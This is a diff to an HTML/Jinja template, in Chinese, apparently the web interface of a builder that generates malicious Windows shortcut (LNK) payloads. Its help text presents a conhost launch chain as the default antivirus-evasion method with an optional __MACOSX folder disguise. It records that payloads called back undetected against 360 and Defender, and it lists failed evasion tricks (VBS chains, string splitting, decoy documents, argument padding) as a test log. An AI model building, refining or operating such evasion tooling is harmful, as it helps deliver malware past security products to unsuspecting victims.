@@ -197,8 +197,37 @@
                     </label>
                     {% endfor %}
                 </div>
-                <span class="help">conhost 启动链为默认免杀方式，始终启用；其余为附加伪装层，可多选叠加。VBS 隐藏链、字符串拆分与诱饵文档会自动串接 Explorer → VBS → BAT 执行链。</span>
-                <span class="help">徽标为实机结果（Win10 + 360 极速版 + Defender，2026-10-26 复测）：conhost 默认链与 __MACOSX 伪装均无拦截、载荷成功回连；VBS / 字符串拆分 / 诱饵会在 run.bat 调用 Explorer 启动载荷时被 360 弹窗拦截；参数空白填充会使 LNK 被 Defender 判为 Exploit:Win32/Kloshag.D!dha 并删除，不建议勾选。</span>
+                <span class="help">conhost 启动链为默认免杀方式，始终启用；可叠加 __MACOSX 目录伪装，进一步隐藏载荷目录。</span>
+                <span class="help">徽标为实机结果（Win10 + 360 极速版 + Defender，2026-10-26 复测）：conhost 默认链与 __MACOSX 伪装均无拦截、载荷成功回连。</span>
+                <div class="evasion-record">
+                    <span class="evasion-record-title">已测试未通过（仅记录，不可选）</span>
+                    <div class="evasion-grid">
+                        {% for key, label, desc in evasion_rejected %}
+                        {% set result = evasion_results.get(key) %}
+                        <div class="evasion-option is-bad is-record">
+                            <span class="evasion-record-dot" aria-hidden="true"></span>
+                            <span class="evasion-text">
+                                <strong><span>{{ label }}</span><span class="evasion-badge">被拦</span></strong>
+                                <small>{{ desc }}</small>
+                                {% if result %}<small class="evasion-note">{{ result[1] }}</small>{% endif %}
+                            </span>
+                        </div>
+                        {% endfor %}
+                    </div>
+                </div>
+                <details class="test-records">
+                    <summary>启动器实测记录（Win10 + 360 极速版 + Defender，2026-10-26 复测）</summary>
+                    <div class="test-record-list">
+                        {% for name, ok, reason in launcher_results %}
+                        <div class="test-record-row">
+                            <span class="badge {{ 'badge-success' if ok else ('badge-danger' if ok is not none else 'badge-muted') }}"><span class="dot"></span>{{ '免杀' if ok else ('被拦' if ok is not none else '不适用') }}</span>
+                            <code>{{ name }}</code>
+                            <span class="muted">{{ reason }}</span>
+                        </div>
+                        {% endfor %}
+                    </div>
+                    <p class="help">记录用于避免重复测试（2026-10-26 复测）；当前版本仅内置 conhost 启动链，其余宿主未接入生成流程。</p>
+                </details>
             </div>
 
             <div class="preview-box"
